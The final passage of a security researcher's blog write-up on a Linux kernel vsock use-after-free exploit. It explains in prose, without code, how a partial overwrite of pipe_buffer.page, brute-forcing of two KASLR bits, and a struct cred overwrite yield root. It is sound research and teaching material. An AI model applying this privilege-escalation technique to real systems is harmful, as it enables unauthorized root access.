  <li>My UAF write to <code>peer_buf_alloc</code> performed partial overwriting of the first half of the <code>pipe_buffer.page</code> pointer, as I showed at the diagram above.</li>
  <li><code>x86_64</code> is little-endian, so the first half of the pointer contains four lower bytes of the address.</li>
</ul>

<p>But when I tried this approach, KASLR carried out its last revenge. It randomized the <code>vmemmap_base</code> address, and the four lower bytes of the <code>struct page</code> pointers carried <strong>two random bits</strong>. Ouch!</p>

<p>However, I decided to brute-force those two bits because I could achieve the UAF write around 5 times before the kworker got a null-ptr-deref after <code>VSOCK_CLOSE_TIMEOUT</code> (8 sec).</p>

<center><img src="https://a13xp0p0v.github.io/img/bruteforce4.jpg" width="60%"/></center>


<p>I found that probing different values of <code>pipe_buffer.page</code> from userspace works perfectly well:</p>
<ul>
  <li>In case of fail, reading from the pipe simply returns <code>Bad address</code>.</li>
  <li>In case of success, reading from the pipe gives <code>struct cred</code> contents.</li>
</ul>

<p>Great! I could finally determine a proper AARW target address, write to the pipe, overwrite euid and egid with 0, and get root. See the PoC exploit demo:</p>

<p>
  <iframe src="https://www.youtube.com/embed/qC95zkYnwb0" frameborder="0" allowfullscreen=""></iframe>
</p>


<h2 id="conclusion">Conclusion</h2>

<p>Bug collisions are painful. Finishing the research anyway is rewarding. Let me quote my good friend:</p>

<center><img src="https://a13xp0p0v.github.io/img/yoda.jpg" width="60%"/></center>


<p>Working on this hard race condition with multiple limitations allowed me to discover new exploitation techniques and to use and improve my pet project <a href="https://github.com/a13xp0p0v/kernel-hack-drill">kernel-hack-drill</a>, which provides a testing environment for Linux kernel security researchers. You are welcome to try it and contribute.</p>

<p>Thanks for reading!</p>

  </div>
</article>

      </div>
    </div></div>
  </body>
</html>
